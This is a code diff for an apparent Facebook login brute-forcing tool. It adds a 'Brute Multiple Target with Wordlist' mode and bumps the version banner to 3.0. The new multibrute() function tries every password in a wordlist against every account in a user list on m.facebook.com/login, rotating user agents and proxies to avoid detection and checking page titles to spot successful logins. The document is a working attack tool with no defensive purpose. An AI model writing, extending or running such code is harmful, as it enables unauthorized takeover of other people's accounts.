@@ -19,7 +19,7 @@ def banner():
     print ('')
     print (B+'███████'+W+'▄▄███████████▄')
     print (B+'▓▓▓▓▓▓█'+W+'              █'+G+'    ╔═╗┌─┐┌─┐┌─┐')
-    print (B+'▓▓▓▓▓▓█'+W+'              █'+G+'    ╠╣ ├─┤│  ├┤ '+O+'    V.2.0')
+    print (B+'▓▓▓▓▓▓█'+W+'              █'+G+'    ╠╣ ├─┤│  ├┤ '+O+'    V.3.0')
     print (B+'▓▓▓▓▓▓█'+W+'              █'+G+'    ╚  ┴ ┴└─┘└─┘')
     print (B+'▓▓▓▓▓▓█'+W+'              █'+G+'        ╔╗ ┬─┐┬ ┬┌┬┐┌─┐')
     print (B+'▓▓▓▓▓▓█'+W+'              █'+G+'        ╠╩╗├┬┘│ │ │ ├┤ ')
@@ -33,6 +33,7 @@ def banner():
     print ('')
     print (C+' 01'+R+'        :'+W+' Brute Single Target with Wordlist')
     print (C+' 02'+R+'        :'+W+' Brute Multiple Target with Single Password')
+    print (C+' 03'+R+'        :'+W+' Brute Multiple Target with Wordlist')
     print ('')
 ua = [
    #Chrome
@@ -168,6 +169,37 @@ def multifbbrute():
             if(str(a) == '<title>Facebook</title>'):
                 print(C+' ['+G+' OK '+C+']'+R+' > '+W+email,end='', flush=True)
 
+def multibrute():
+    URL = 'https://m.facebook.com/login'
+    print ('')
+    username = input(C+' Userlist '+R+'> '+W)
+    passwd = input(C+' Wordlist '+R+'> '+W)
+    print ('')
+    uname = open(username, 'r')
+    for email in uname:
+        print(C+' ['+O+' USER '+C+']'+R+' > '+W+email)
+        passw = open(passwd, 'r')
+        for password in passw:
+            form_data = {
+                'email' : email,
+                'pass' : password
+            }
+            user_agent = random.choice(ua)
+            headers = {'User-Agent': user_agent}
+            proxies_a = random.choice(prox)
+            proxies = {'http': proxies_a}
+            with requests.Session() as c:
+                c.get(URL, headers=headers, proxies=proxies)
+                r = c.post(URL, data=form_data, headers=headers, proxies=proxies)
+                b = c.get('https://m.facebook.com/home.php', headers=headers, proxies=proxies)
+                soup = BeautifulSoup(b.content, 'html.parser')
+                a = soup.find('title')
+                if(str(a) == '<title>Masuk Facebook | Facebook</title>'):
+                    print(C+' ['+R+' ERROR '+C+']'+R+' > '+W+password,end='', flush=True)
+                if(str(a) == '<title>Facebook</title>'):
+                    print(C+' ['+G+' OK '+C+']'+R+' > '+W+password,end='', flush=True)
+        print ('')
+
 def main():
     print ('')
     cmd = str(input(R+' > '+W))
@@ -176,6 +208,9 @@ def main():
         main()
     elif cmd == '02' or cmd == '2':
         multifbbrute()
+        main()
+    elif cmd == '03' or cmd == '3':
+        multibrute()
         main()
     elif cmd == 'clear':
         banner()
